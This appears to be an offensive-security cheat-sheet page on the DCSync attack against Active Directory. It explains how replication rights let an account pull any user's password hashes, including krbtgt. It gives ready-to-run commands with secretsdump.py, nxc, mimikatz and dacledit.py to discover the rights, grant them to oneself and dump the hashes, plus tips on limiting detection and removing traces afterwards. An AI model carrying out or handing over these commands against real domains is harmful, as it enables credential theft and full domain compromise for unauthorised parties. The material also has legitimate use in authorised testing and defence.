**DCSync** — trick a Domain Controller (DC) into handing you the password hashes of any account by pretending to be another DC asking for a routine sync. Domain Controllers keep each other up to date by copying account secrets between themselves (this is called replication, and runs over the MS-DRSR protocol); if your account holds the two replication rights `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`, you can send that same "please replicate to me" request and receive any account's hash — including `krbtgt` — without ever running code on the DC. It is fundamentally an **ACL abuse** (an ACL is an object's permission list): any principal granted those rights, not just Domain Admins, can do it. For the full domain-database dump and on-DC methods, see [Dump NTDS.dit](Dump%20NTDS.dit.md); this page is the focused, ACL-centric view.

```
You (with replication rights) -> DC: "replicate this account to me"
DC -> You: the account's NT hash + Kerberos keys
No code runs on the DC; it looks like normal DC-to-DC sync
```

## Discovery

Who holds the replication rights (a common delegated-ACL misconfiguration):

```powershell

# PowerView
Get-ObjectAcl -DistinguishedName 'DC=DOMAIN,DC=LOCAL' -ResolveGUIDs | ? { $_.ObjectType -match 'replication-get' }

```

In BloodHound this is the `DCSync` (or `GetChanges` + `GetChangesAll`) edge into the Domain node.

## Exploitation

### Pull a single account (stealthier)

Prefer `-just-dc-user` for just `krbtgt` (→ [Golden Ticket](../Persistence/Golden%20Ticket.md)) or one admin, rather than the whole domain:

```bash

secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP' -just-dc-user 'krbtgt'
secretsdump.py -hashes ':USER_NT_HASH' 'DOMAIN/USER_NAME@DC_IP' -just-dc-user 'Administrator'
nxc smb 'DC_IP' -u 'USER_NAME' -p 'USER_PASS' --ntds

```

```powershell

# Windows (mimikatz), in the context of a principal with the rights
lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt

```

### Grant yourself DCSync first (WriteDacl → DCSync)

If you hold `WriteDacl`/`GenericAll` on the domain object, add the replication rights to your account, then sync - see [DACL Abuse Primitives](../ACL%20Attacks/DACL%20Abuse%20Primitives.md):

```bash

dacledit.py -action write -rights DCSync -principal 'USER_NAME' -target-dn 'DC=DOMAIN,DC=LOCAL' 'DOMAIN/USER_NAME:USER_PASS'
# ... then DCSync as above, and remove the ACE afterwards

```

## Caution

- DCSync from a non-DC source is logged (directory-replication event `4662` with the replication GUIDs) - expect detection in monitored domains; `-just-dc-user` limits exposure.
- If you added a DCSync ACE, **remove it** (`dacledit.py -action remove`) during cleanup.

## References

- The Hacker Recipes - DCSync - https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
- Impacket (secretsdump.py) - https://github.com/fortra/impacket
- mimikatz - https://github.com/gentilkiwi/mimikatz
